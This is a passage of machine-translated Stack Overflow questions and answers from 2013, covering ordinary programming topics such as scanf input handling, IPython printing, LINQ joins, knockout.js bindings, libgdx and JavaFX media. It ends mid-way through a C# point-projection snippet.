在了解了更多关于构建过程的信息后，我想推荐使用[MSBuild 任务](http://msdn.microsoft.com/en-us/library/0k6kkbsd.aspx)；特别是，[Exec 任务](http://msdn.microsoft.com/en-us/library/x8zx72cd.aspx)可能提供最可行的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-14T13:24:32.580

由于一些构建后事件没有从它们定义的属性表继承，我质疑鸭子并降落在这里。

我有个好消息：自 Visual Studio 2013 起，Pre-Build 和 Post-Build 事件命令行有一个“*从父级或项目默认值继承*”选项，它添加了属性表中的所有事件。

（使用 Visual Studio 2013 和 2017 Professional 测试）

# c - 菜单上的防御性编程。我应该有什么类型的输入？

> ID：15232330
> 
> 赞同：2
> 
> 时间：2013-03-05T19:21:19.753
> 
> 标签：c, defensive-programming

我试图让防御性编程以整数形式输入，但如果我输入一个字符，程序将进入无限循环。然后我切换到将输入作为字符，但它会循环两次。一次用于错误字符，一次用于行尾击键。

有没有办法让循环，只有一次？

代码：

```
int main(int argc, char *argv[])
{
    char choice='5';
    while (choice != '1' && choice !='2' && choice !='3' && choice!='4' && choice!='0')
        {
             printf("Parakalw epilekste ena apo ta parakatw\n\n");
             printf("1.\tKafe 1.5 euro\n");
             printf("2.\tKafe me gala 1.8 euro\n");
             printf("3.\tSokolata 2.1euro\n");
             printf("4.\tSokolata me gala 2.4 euro\n");
             printf("0.\tExodos\n\n");
             printf("parakalw eisagete thn epilogh sas: ");
             scanf("%c",&choice);
        }
system("PAUSE");    
return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:24:09.017

用于`scanf(" %c", &choice)`使其跳过空格，否则在选择字符后您的换行符将留在标准输入中，并且将在下一次 scanf 调用中读取。说明符前面的空格意味着它将匹配任何类型的空白字符（空格、制表符和回车符）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:54:46.460

对于防御性编程（你到底是什么意思），我根本不会使用`scanf`，它很容易出错。

相反，使用 读取输入行`fgets`，然后根据需要对其进行解析，然后使用修剪、自定义解析代码或可能`sscanf`，可能在一些验证之后。

此外，您最好`*scanf`始终检查任何函数的返回值。检查两者的实际错误，以及实际扫描了多少项目。

# ipython - IPython 交互式 shell 输出格式化配置

> ID：15232333
> 
> 赞同：0
> 
> 时间：2013-03-05T19:21:36.977
> 
> 标签：ipython, word-wrap

如果对此有快速解决方案，请提前道歉。在 IPython shell 中，如果我有这个：

```
In [1]: x = [i for i in range(100)] 
```

然后如果我调用它，我会在新行上打印一个包含每个元素的列表：

```
In [2]: x
Out[2]: [0
        1,
        2, 
```

依此类推，一直到 100。烦人，因为我经常调用对象并且不知道它们会持续多久（并且不想事先检查，也不希望我的最后一个命令被推高并且不碍事）。我怎样才能让它像在常规 python 中那样打印结果？IE：

```
>>> x
[1,2,3,4,5,6,7,8,....
9,10,11, ..... 100] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:35:04.627

你想要的是禁用漂亮的打印。

```
$ ipython --help
[...]
--no-pprint
    Disable auto auto pretty printing of results.
[...] 
```

这使 ：

```
$ ipython --no-pprint
[...]

In [1]: x = [i for i in range(100)]

In [2]: x
Out[2]: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99] 
```

# css - 样式化 Facebook 和 Twitter 按钮

> ID：15232335
> 
> 赞同：0
> 
> 时间：2013-03-05T19:21:45.303
> 
> 标签：css, facebook, twitter, styles, social

如何更改这些社交按钮的字体、颜色等？这里有代码：

Facebook：

```
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_ES/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
</script>

<div class="fb-like" data-href="http://www.facebook.com/pages/Verbum/435794593170850?skip_nax_wizard=true" data-send="true" data-layout="button_count" data-width="450" data-show-faces="false">        
</div> 
```

推特：

```
<a href="http://twitter.com/_verbum" data-size="large" class="twitter-follow-button">Seguir @_verbum</a> 
<script src="http://platform.twitter.com/widgets.js" type="text/javascript"></script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:52:36.990

我建议你使用像 Stylish 这样的扩展，并为域编写用户样式，例如 ('facebook.com') 或 ('twitter.com')。

如果 iframe url 与 userstyle 的域匹配，这应该设置 iframe 中的任何内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T05:16:20.497

不，我不认为这是可能的。可以理解的是，您希望它更多地集成到您网站的 CI 中——但另一方面，重要的是它可以被识别为“属于”Facebook，以便用户清楚他们在每次看到的内容时间。网络上的每个站点都有自己的插件“版本”会适得其反

# rhapsody - ibm rhapsody 7.6.1 在另一个类中生成事件

> ID：15232339
> 
> 赞同：0
> 
> 时间：2013-03-05T19:21:57.930
> 
> 标签：rhapsody

我有两个课程，一个恒温器和一个加热器。关联是两个类之间的聚合。

现在，当我从类恒温器生成类加热器中的事件时，我得到一个 Java 空指针错误（运行时错误）。

我使用的代码是`itsHeater.gen(new evHeaterOn())`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-30T08:52:46.327

聚合生成一个指针。除非您初始化该指针，否则它将指向空值。创建一个构建类来实例化您的实例并正确初始化指针。

# c# - 基于外部属性排序

> ID：15232343
> 
> 赞同：2
> 
> 时间：2013-03-05T19:22:10.407
> 
> 标签：c#, linq

我有一个现有的 LINQ 查询来检索一些项目：

```
var result = from foo in x.SomeThings
             from bar in x.OtherThings
             where foo.RefId == bar.RefId
             select foo; 
```

x 是一个包含三个属性的对象：

1.  `List<MyThing> SomeThings`
2.  `List<MyThing> OtherThings`
3.  `List<MyStuff> MyStuffs`包含一个也是 MyThing 的属性。

以下是课程的概述：

```
public class X
{
    public List<MyThing> SomeThings;
    public List<MyThing> OtherThings;
    public List<MyStuff> MyStuffs;
}

public class MyThing
{
    public int RefId;
}

public class MyStuff
{
    public MyThing TheThing;
    public DateTime WhenHappened;
} 
```

如何根据匹配的 RefId 值，根据 WhenHappened 的最早值对返回的 foo 进行排序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:55:53.867

因此，正如[Eric Lippert 所提到的](https://stackoverflow.com/questions/15232343/sort-based-on-outer-property/15232909#comment21474831_15232343)，您可以在`Join`此处使用运算符，而不是使用`SelectMany`来执行完整的笛卡尔积（这是您的代码示例的最终结果），并且它的性能会好很多。

接下来，为了按显示的值排序，您需要加入所有三个列表，而不仅仅是前两个。一旦你加入了所有三个序列，排序就很简单了：

```
var query = from first in x.SomeThings
            join second in x.OtherThings
            on first.RefId equals second.RefId

            join third in x.MyStuffs
            on first.RefId equals third.TheThing.RefId

            orderby third.WhenHappened
            select first; 
```

The result of this query is that it will return items that are in all three sequences ordered by the `WhenHappened` property of `MyStuffs`.

# windows-installer - InstallShield - 来自引用 DIM 的对话框无法在 MSI 项目 UI 序列中显示

> ID：15232345
> 
> 赞同：0
> 
> 时间：2013-03-05T19:22:13.107
> 
> 标签：windows-installer, installshield

我正在使用 InstallShield 2012 Spring，并且我有一个“主要”基本 MSI 项目。作为我们开发工作的一部分，我们使用 DIM 项目来帮助协调多开发人员的工作。在我们的环境中，我们有一个主（基本 MSI）项目，它将引用其他 DIM 项目。DIM 项目包含（除其他外）对话框。

在 DIM 项目中（此处仅举一个通用示例），我有一个新对话框，其中提供了“下一步”和“后退”按钮。我已经将“下一个”和“后退”按钮行为配置为发出一个“NewDialog”事件，其中参数是下一个/上一个面板，因此（分别）显示并且条件为 1（即始终）。

例如在 DIM 中，我的 MyDIMDialog 具有以下行为：ControlName“Back”事件“NewDialog”参数“APreviousPanelFromMainProject”条件“1”ControlName“Next”事件“NewDialog”参数“ReadyToInstall”条件“1”

基于上述 MyDIMDialog 是内置“准备安装”之前的最后一个面板。

在主（基本 MSI）项目中，我引用了 DIM 模块并将其与一个功能相关联。我已经在主项目中配置了对话框，使得“APreviousPanelFromMainProject”的 NewDialog 事件具有引用的 DIM 对话框的参数（生成对话框名称）。

旁注——我正在尝试对现有 UI 对话框中的引用对话框进行排序——而不是像内置的“补丁欢迎”那样作为“顶级”UI 序列对话框。

但是，当我构建并运行 MSI（我们使用的是 MSI 而不是 setup.exe）并进入 APreviousPanelFromMainProject 面板时，单击下一步什么也没做——面板只是闪烁了一下，但没有按顺序进入我导入的 DIM 对话框。

我还尝试配置 APreviousPanelFromMainProject，使其“next”的 NewDialog 事件的参数为“MyDIMDialog”（即我不使用生成的引用对话框名称，其格式为 MyDIMDialog.XXXXXXXX_XXXX ...）。在这种情况下，当我运行安装程序时，我收到一个错误“错误 2803。对话框视图没有找到对话框 MyDIMDialog 的记录”。

所以问题归结为 --> 如何在基本 MSI 项目中对 DIM 引用对话框进行排序？

我的 google-foo 没有帮助解决这个问题，所以希望这里有人能提供帮助。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T13:20:07.227

[在DIM 项目中使用 SQL 对话框](http://blogs.flexerasoftware.com/installtalk/2011/12/using-sql-dialogs-with-dim-projects.html)的想法对您的案例有帮助吗？

请注意，后退按钮的设置可能会比您想要的更紧密地将 DIM 与特定的消费项目联系起来。虽然这对于拆分工作很好，但如果您稍后尝试在不同的项目中重用相同的 DIM，请记住这一点。

# javascript - 从 knockout.js 中的 JSON 数组获取所有键

> ID：15232346
> 
> 赞同：1
> 
> 时间：2013-03-05T19:22:24.370
> 
> 标签：javascript, knockout.js, knockout-mapping-plugin

我第一次使用 knockout.js 并且有一个数组如下：

```
function AppViewModel() {
    var self = this;

    self.calls = ko.observableArray([
        { description: 'Create a new project', url: '/feeds/create', method: 'Get', params: [{ success: "true", token: "123adfds1" }] },
        { description: 'Get info', url: '/feeds/info', method: 'Get', params: [{ success: "true", token: "123adfds1" }] },
    ]);
}
ko.applyBindings(new AppViewModel()); 
```

我可以使用 foreach 语句来获取它们：

```
<tbody>
<!-- ko foreach: { data: calls, as: 'call' } -->
    <tr> 
        <td><span data-bind="text: description"></span></td>
        <td><span data-bind="text: url"></span></td>
        <td><span data-bind="text: method"></span></td>
        <!-- ko foreach: params -->
        <td>
            <span class="params" data-bind="text: $data"></span>                            
        </td>
        <!-- /ko -->
        <td class="last"><a href="" class="btn btn-mini">Edit</a></td>
    </tr>
<!-- /ko -->
</tbody> 
```

我唯一的问题是我并不总是知道“params”数组中所有元素的名称，因此我想列出所有元素。

我怎样才能做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:58:11.960

我认为淘汰赛只会对数组进行遍历。你可以试试这个：

```
<td data-bind="foreach: { data: Object.keys(params) }">
    <span data-bind="text: params[$data]"></span>
</td> 
```

请注意 Object.keys 仅适用于现代浏览器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T20:01:18.547

它使图片有点混乱，您的“参数”不仅是一个具有不可预见的属性数量的对象，而且显然是一个对象数组，每个对象具有不可预见的属性数量。但是，一种解决方案可能是向您的视图模型条目添加一个新的“计算”属性，如下所示：

```
function AppViewModel() {
    var self = this;

    self.calls = ko.observableArray([
        { description: 'Create a new project', url: '/feeds/create', method: 'Get', params: [{ success: "true", token: "123adfds1" }] },
        { description: 'Get info', url: '/feeds/info', method: 'Get', params: [{ success: "true", token: "123adfds1" }] },
    ]);

    ko.utils.arrayForEach(self.calls(), function(elem) {
        elem.parameterNames = ko.computed(function () {
            var keys = [];
            ko.utils.arrayForEach(elem.params, function (paramEntry) {
                for (var key in paramEntry)
                    keys.push({ key: key, value: paramEntry[key] });

            });

            return keys;
        });
    });
} 
```

这会将您的结构及其意想不到的属性名称扁平化为标准化“键”/“值”实体的集合。然后您的 Knockout 绑定可能看起来像这样（请注意，最上面的绑定是针对新的计算属性“parameterNames”而不是针对“params”）。

```
 <!-- ko foreach: parameterNames -->
    <td>
        <span class="params" data-bind="text: key"></span> - <span class="params" data-bind="text: value"></span>                       
    </td> 
```

这有帮助吗？

# java - Android mysql SocketException：权限被拒绝

> ID：15232347
> 
> 赞同：0
> 
> 时间：2013-03-05T19:22:24.870
> 
> 标签：java, android

我目前正在尝试创建一个必须从 mysql 服务器获取一些数据的应用程序。

我知道，通常在清单中添加 Internet 权限可以解决此问题。

但是，当我尝试这样做时，出现以下错误（LogCat 显示）：

```
> 03-05 20:01:41.604: D/ERROR(25938): java.sql.SQLException: Unable to
> connect to any hosts due to exception: java.net.SocketException:
> java.net.SocketException: Permission denied 
```

通常我会检查我的 Manifest.xml 并放入所需的代码，但是我当前的清单看起来像：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.speelveldapp"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="9"
    android:targetSdkVersion="17" />

<supports-screens
    android:anyDensity="true"
    android:smallScreens="true" />

<user-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<application 
```

一定有什么我错过了，但我不知道是什么。因此，如果有人能给我一个线索，那就太好了！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:25:55.557

你有一个错字；

> <***用户***-permission android:name="android.permission.INTERNET" />

应该

> <***使用***-permission android:name="android.permission.INTERNET" />

# javascript - javascript 名称正则表达式

> ID：15232348
> 
> 赞同：3
> 
> 时间：2013-03-05T19:22:29.143
> 
> 标签：javascript, regex

我正在尝试为名称编写正则表达式。姓名可以选择以头衔开头（博士、夫人等），也可以包含两个或三个姓名，中间名可以选择缩写为 (X.)

例如，应匹配以下名称：

*   杰夫·T·沃克博士
*   苏珊·B·安东尼
*   迈克尔·宾厄姆顿先生
*   乔治布什夫人

以下不应该匹配

*   加菲猫
*   J博士
*   T. 疼痛
*   美利坚合众国
*   2020 年 2 月 15 日

这是我所拥有的：

```
^(Dr\.|Mr\.|Mrs\.)?[A-Z][a-z]+\s([A-Z][a-z]+|[A-Z]\.)\s[A-Z][a-z]+? 
```

我不太确定我在哪里出错了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:31:45.013

`^((Dr|Mr|Mrs)\. )?[A-Z][a-z]+( [A-Z]([a-z]+|\.))? [A-Z][a-z]+`

这是我为解决它所做的：

*   在前缀后添加一个空格 - 之前，您匹配的是“Dr.James”，而不是“Dr. James”
*   在姓氏之后删除了最后的问号 - 如果不在括号之后，则`?`导致“[惰性匹配](https://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions)” - 匹配尽可能少的字符（在这种情况下为 1）
*   使中间名可选
*   删除了一些冗余（例如前缀和中间名）
*   替换`\s`为空格 - 它更易于阅读，并且 \s 匹配制表符、换行符等。

# jquery - 在 3rd 方工具提示中添加日期选择器 - 第 2 部分

> ID：15232352
> 
> 赞同：0
> 
> 时间：2013-03-05T19:22:34.297
> 
> 标签：jquery, html, jquery-ui-datepicker

我之前问过一个类似的问题，并得到了一个普遍有效的答案，但不适用于我的情况。我将尝试在这里更好地解释我的问题：

我有一个用于创建工具提示的外部 js 库。这就是图书馆所做的一切。我根据鼠标悬停的项目动态生成工具提示内容。在此工具提示中，我使用输入字段允许用户通过 jquery datepicker 选择日期：http: [//jqueryui.com/datepicker/](http://jqueryui.com/datepicker/)。

**问题：** 工具提示的工作方式是，如果鼠标离开工具提示区域，它将消失。因此，当鼠标移动到日期选择器时，工具提示消失了，只剩下日期选择器。

我创建工具提示内容的方式是动态连接一些字符串：
`content += 'test1' + '<input type="text" id="datepicker" >';`

然后我通过调用显示第三方工具提示：
`tooltip.pop(callerContainer, content);`

我不知道如何将日期选择器附加到输入字段并将**日期选择器对象**添加到**内容字符串**变量。

**尝试过的解决方案：** 我尝试了一个技巧，方法是在工具提示被合并到页面的 DOM 后调用一种方法来将日期选择器添加到工具提示中：这是
`setTimeout(attachDatepicker(), 600)` 在哪里`attachDatepicker()`：`$("#datepicker").datepicker();`

我还尝试`onmouseover`在输入字段中添加一个：
`<input type="text" id="datepicker" onmouseover="attachDatepicker()">'`

工具提示窃取所有鼠标事件，所以如果我想检查鼠标是否在某个元素之外，我必须像这样单独绑定： $("#element_id").mouseleave(function () { ... });

**结果：** 方法`setTimeout`不起作用，但`onmouseover`解决方案确实有效。它显示了日期选择器，现在我已经描述了当用户选择日期时工具提示消失的问题。

我也可以将实际的日历小部件嵌入到工具提示的 html 中，但到目前为止我一直无法做到这一点，因为一旦显示工具提示，我就无法更改它的尺寸（如果我添加更多内容）。

**注意：** 我在 Chrome 中注意到的是，如果我创建一个 Date 类型的输入字段，Chrome 会自动在输入字段中添加一个日期选择器，最重要的是，在该日期选择器上移动鼠标不会导致工具提示消失。我想在其他浏览器（如 Firefox）中模仿 Chrome 中日期选择器的行为。我确信它可以做到，因为 Chrome 做到了——我只是不知道。（我知道为什么 Chrome 会像这样处理日期字段，所以这不是我关心的问题。）

这是我正在尝试制作的示例 - 它在 Chrome 中看起来像这样（Chrome 自动将日期选择器添加到日期输入字段）并且您可以看到将鼠标移动到日期选择器不会生成工具提示（如果你愿意，日期选择器父容器）走开：![日期类型输入字段的 Chrome 自动处理 - 我想做这个](../Images/a9fc16ce46a8e59fda628a3834887db7.png)

问题是如何制作一个工具提示，我可以在其中添加一个日期选择器，并且能够在选择日期时不关闭工具提示的情况下选择一个日期（当鼠标远离工具提示容器，但在容器的子节点上）

**编辑：** jsfiddle 现在位于： http: [//jsfiddle.net/yad6L/14/](http://jsfiddle.net/yad6L/14/) （Datepicker 甚至不在那里加载 - 我添加了 2 个 jquery js 文件）

# android - android libgdx 与 Actor 一起拍摄

> ID：15232353
> 
> 赞同：1
> 
> 时间：2013-03-05T19:22:35.963
> 
> 标签：android, libgdx, actor

我不能用我的演员拍摄。当我按住射击按钮时，我的 Actor 前面有子弹，但它没有移动。我不知道如何让它像陨石一样移动......

```
public class Game implements ApplicationListener {
   Texture meteoriteImage;
   Texture shipImage;
   Texture bulletImage;
   SpriteBatch batch;
   OrthographicCamera camera;
   Rectangle ship;
   Rectangle bullet;
   Array<Rectangle> meteorites;
   long lastMeteoriteTime;

   public void create() {
      meteoriteImage = new Texture(Gdx.files.internal("meteorite.png"));
      shipImage = new Texture(Gdx.files.internal("ship.png"));
      bulletImage = new Texture(Gdx.files.internal("bullet.png"));

      camera = new OrthographicCamera();
      camera.setToOrtho(false, 800, 480);
      batch = new SpriteBatch();

      ship = new Rectangle();
      ship.x = 800 - 48;
      ship.y = 480 / 2 - 48 / 2;
      ship.width = 48;
      ship.height = 48;

      meteorites = new Array<Rectangle>();
      spawnMeteorite();
   }

   private void spawnMeteorite() {
      Rectangle meteorite = new Rectangle();
      meteorite.y = MathUtils.random(0, 480-48);
      meteorite.x = 0;
      meteorite.width = 48;
      meteorite.height = 48;
      meteorites.add(meteorite);
      lastMeteoriteTime = TimeUtils.nanoTime();
   }

   public void render() {
      Gdx.gl.glClearColor(0, 0, 0.2f, 1);
      Gdx.gl.glClear(GL10.GL_COLOR_BUFFER_BIT);
      camera.update();
      batch.setProjectionMatrix(camera.combined);

      batch.begin();
      batch.draw(shipImage, ship.x, ship.y);
      for(Rectangle meteorite: meteorites) {
         batch.draw(meteoriteImage, meteorite.x, meteorite.y);
      }
      batch.end();

      if(Gdx.input.isKeyPressed(Keys.DPAD_UP)) ship.y += 200 * Gdx.graphics.getDeltaTime();
      if(Gdx.input.isKeyPressed(Keys.DPAD_DOWN)) ship.y -= 200 * Gdx.graphics.getDeltaTime();
      if(Gdx.input.isKeyPressed(Keys.BUTTON_Y)){
              bullet = new Rectangle();
              bullet.x = ship.x - 48;
              bullet.y = ship.y;
              bullet.width = 48;
              bullet.height = 48;
              batch.begin();
              batch.draw(bulletImage, bullet.x, bullet.y);
              batch.end();

          while(bullet.x > 0){
              bullet.x -= 200 * Gdx.graphics.getDeltaTime();
          }
      }

      if(ship.x < 0) ship.x = 0;
      if(ship.x > 800 - 48) ship.x = 800 - 48;
      if(ship.y < 0) ship.y = 0;
      if(ship.y > 480 - 48) ship.y = 480 - 48;

      if(TimeUtils.nanoTime() - lastMeteoriteTime > 1000000000) spawnMeteorite();

      Iterator<Rectangle> iter = meteorites.iterator();
      while(iter.hasNext()) {
         Rectangle meteorite = iter.next();
         meteorite.x += 200 * Gdx.graphics.getDeltaTime();
         if(meteorite.x + 48 < 0) iter.remove();
         if(meteorite.overlaps(ship)) {

            iter.remove();
         }
      }
   }

   public void dispose() {
      shipImage.dispose();
      meteoriteImage.dispose();
      bulletImage.dispose();
      batch.dispose();
   }

   public void resize(int width, int height) {
   }

   public void pause() {
   }

   public void resume() {
   }
} 
```

我使用了本教程：[https ://code.google.com/p/libgdx/wiki/SimpleApp](https://code.google.com/p/libgdx/wiki/SimpleApp)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T03:28:30.193

那么这 - 不是你想要的。

```
while(bullet.x > 0){
    bullet.x -= 200 * Gdx.graphics.getDeltaTime();
} 
```

您真的希望子弹位置具有动画效果吗？因此，您需要将子弹作为对象添加到世界中，然后在每次调用“渲染”时更改它的 x 位置。否则你根本看不到它的动画......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-01T01:52:01.903

似乎你错过了在子弹循环中检查哪个陨石，试试这个：

```
while(iter2.hasNext()) {
  Rectangle bullet = iter2.next();
  bullet.x -= 200 * Gdx.graphics.getDeltaTime();
  if(bullet.x + 48 < 0) iter2.remove();
  iter = meteorites.iterator();
  while(iter.hasNext()) {
    if(bullet.overlaps(iter.next())) {
      iter2.remove();
      iter.remove();
    }
  }
} 
```

请注意，不要简单地将原始陨石循环放入子弹循环中，因为您在两个循环中都有翻译代码。

# java - MediaPlayer-javaFX 中的简单 URI 和本地路径使用

> ID：15232355
> 
> 赞同：1
> 
> 时间：2013-03-05T19:22:38.627
> 
> 标签：java, media-player, javafx

我有以下代码来显示音频的频谱。但它使用 URI。但是如何使用简单的路径，如 C:/abc/asas.wav ...或什么？知道吗？当我使用本地路径时，它给了我异常：

```
Exception in thread "main" java.lang.RuntimeException: Exception in Application start method
        at com.sun.javafx.application.LauncherImpl.launchApplication1(Unknown Source)
        at com.sun.javafx.application.LauncherImpl.access$000(Unknown Source)
        at com.sun.javafx.application.LauncherImpl$1.run(Unknown Source)
        at java.lang.Thread.run(Thread.java:722) 
```

代码：

```
package chartaudiobar;

import javafx.application.Application;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.chart.BarChart;
import javafx.scene.chart.CategoryAxis;
import javafx.scene.chart.NumberAxis;
import javafx.scene.chart.XYChart;
import javafx.scene.media.AudioSpectrumListener;
import javafx.scene.media.Media;
import javafx.scene.media.MediaPlayer;
import javafx.stage.Stage;

public class ChartAudioBar extends Application {

    private XYChart.Data<String, Number>[] series1Data;
    private AudioSpectrumListener audioSpectrumListener;

    private static final String AUDIO_URI = System.getProperty("demo.audio.url","http://download.oracle.com/otndocs/products/javafx/oow2010-2.flv");
    private static MediaPlayer audioMediaPlayer;
    private static final boolean PLAY_AUDIO = Boolean.parseBoolean(System.getProperty("demo.play.audio","true"));

    private void init(Stage primaryStage) {
        Group root = new Group();
        primaryStage.setScene(new Scene(root));
        root.getChildren().add(createChart());
        audioSpectrumListener = new AudioSpectrumListener() {
            @Override public void spectrumDataUpdate(double timestamp, double duration,
                    float[] magnitudes, float[] phases) {
                for (int i = 0; i < series1Data.length; i++) {
                    series1Data[i].setYValue(magnitudes[i] + 60);
                }
            }
        };
    }

    public void play() {
        this.startAudio();
    }

    @Override public void stop() {
        this.stopAudio();
    }

    protected BarChart<String, Number> createChart() {
        final CategoryAxis xAxis = new CategoryAxis();
        final NumberAxis yAxis = new NumberAxis(0,50,10);
        final BarChart<String,Number> bc = new BarChart<String,Number>(xAxis,yAxis);
        bc.setId("barAudioDemo");
        bc.setLegendVisible(false);
        bc.setAnimated(false);
        bc.setBarGap(0);
        bc.setCategoryGap(1);
        bc.setVerticalGridLinesVisible(false);
        // setup chart
        bc.setTitle("Live Audio Spectrum Data");
        xAxis.setLabel("Frequency Bands");
        yAxis.setLabel("Magnitudes");
        yAxis.setTickLabelFormatter(new NumberAxis.DefaultFormatter(yAxis,null,"dB"));
        // add starting data
        XYChart.Series<String,Number> series1 = new XYChart.Series<String,Number>();
        series1.setName("Data Series 1");
        //noinspection unchecked
        series1Data = new XYChart.Data[128];
        String[] categories = new String[128];
        for (int i=0; i<series1Data.length; i++) {
            categories[i] = Integer.toString(i+1);
            series1Data[i] = new XYChart.Data<String,Number>(categories[i],50);
            series1.getData().add(series1Data[i]);
        }
        bc.getData().add(series1);
        return bc;
    }

     private void startAudio() {
        if (PLAY_AUDIO) {
            getAudioMediaPlayer().setAudioSpectrumListener(audioSpectrumListener);
            getAudioMediaPlayer().play();
        }
    }

    private void stopAudio() {
        if (getAudioMediaPlayer().getAudioSpectrumListener() == audioSpectrumListener) {
            getAudioMediaPlayer().pause();
        }
    }

    private static MediaPlayer getAudioMediaPlayer() {
        if (audioMediaPlayer == null) {
            Media audioMedia = new Media(AUDIO_URI);
            audioMediaPlayer = new MediaPlayer(audioMedia);
        }
        return audioMediaPlayer;
    }

    @Override public void start(Stage primaryStage) throws Exception {
        init(primaryStage);
        primaryStage.show();
        play();
    }
    public static void main(String[] args) { launch(args); }
} 
```

那么如何在这里使用本地路径呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-18T09:39:22.640

我有同样的问题，我用这个：

```
File file = new File("C:\\abc\\asas.wav");
audio = new Media(file.toURI().toURL().toString());
audioMediaPlayer = new MediaPlayer(audio); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T14:13:42.477

您可以通过添加协议将路径转换为 ​​URI

C:/abc/asas.wav 在您的示例中将是 file:/C:/abc/asas.wav

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-03T20:19:39.413

Jyoti Shaw 发布此问题 4 年后，如何在 ChartAudioBar 类中使用本地音乐文件。Wafu 在他的网页上有答案[https://osu.ppy.sh/forum/p/4629060](https://osu.ppy.sh/forum/p/4629060) 在页面的中间位置，在他的标题“频谱”下，单击“代码”以查看源代码。Wafu 的解决方案类似于 Sam de Meyer 在上面的回答中的解决方案。

//我们不需要这一行，因为我们需要使用本地音乐文件。

//private static final String AUDIO_URI = System.getProperty("demo.audio.url"," [http://download.oracle.com/otndocs/products/javafx/oow2010-2.flv](http://download.oracle.com/otndocs/products/javafx/oow2010-2.flv) ");

```
 private static MediaPlayer audioMediaPlayer; 
```

//我们不需要这个，它和以前一样没用。

//private static final boolean PLAY_AUDIO = Boolean.parseBoolean(System.getProperty("demo.play.audio","true"));

//无论如何我们都需要输出默认图表，所以假设我们将其放入文件 data.txt，因此需要将“import java.io.File”添加到导入中。

```
 private static File filedata = new File("data.txt"); 
```

// ************************************************ *****************************

```
 private static MediaPlayer getAudioMediaPlayer() {
        if (audioMediaPlayer == null) { 
```

//我们需要下面的代码，但我还是注释了它以显示差异，我们需要一个本地文件，所以这不起作用。

//媒体 audioMedia = new Media(AUDIO_URI);

//所以我们创建一个本地文件，例如当前文件夹中的mp3.mp3，它可以是任何你想要的。

//文件 audiofile = new File("mp3.mp3");

```
 File audiofile = new File("C:/music/SummerMix.mp3"); 
```

//现在我们需要像以前一样制作 audioMedia - 所以它需要是 URI，.toURI() 很容易确保，但除此之外，它还需要一个字符串 URI，所以 .toString() 将确保这一点。

```
 Media audioMedia = new Media(audiofile.toURI().toString());
        audioMediaPlayer = new MediaPlayer(audioMedia);
     }
        return audioMediaPlayer;
     } 
```

# c# - 点在由 2 个点定义的线上的投影

> ID：15232356
> 
> 赞同：8
> 
> 时间：2013-03-05T19:22:44.460
> 
> 标签：c#, geometry

我一直在努力解决这个问题。。

要解决的问题。。

说我有3分..

```
P1 ---------- P2, and P3 can be anywhere around P1 and P2 
```

将 P3 插值到 P1 和 P2 之间的线上的计算公式是什么？

我需要一个公式来计算位于 P1 和 P2 之间的线上的 P3 的新 X、Y 坐标。

到目前为止我的代码..

```
 public Point lerp(Point P0, Point P1, Point P) 
        {
            double y1 = P0.Y + (P1.Y - P0.Y) * ((P.X - P0.X) / (P1.X - P0.X));
            double x1 = P.X;

            double y2 = P.Y;
            double x2 = P0.X + (P1.X - P0.X) * ((P.Y - P0.Y) / (P1.Y - P0.Y));

            return new Point((x1 + x2) / 2, (y1 + y2) / 2);
        } 
```

我的参考.. [http://en.wikipedia.org/wiki/Linear_interpolation](http://en.wikipedia.org/wiki/Linear_interpolation)

上面的代码让它接近了，但它有点偏离......

这是 Corey Ogburn 转换后的 javascript 代码

```
 public Point _pointOnLine(Point pt1, Point pt2, Point pt)
        {
            bool isValid = false;

            var r = new Point(0, 0);
            if (pt1.Y == pt2.Y && pt1.X == pt2.X) { pt1.Y -= 0.00001; }

            var U = ((pt.Y - pt1.Y) * (pt2.Y - pt1.Y)) + ((pt.X - pt1.X) * (pt2.X - pt1.X));

            var Udenom = Math.Pow(pt2.Y - pt1.Y, 2) + Math.Pow(pt2.X - pt1.X, 2);

            U /= Udenom;

            r.Y = pt1.Y + (U * (pt2.Y - pt1.Y));
            r.X = pt1.X + (U * (pt2.X - pt1.X));

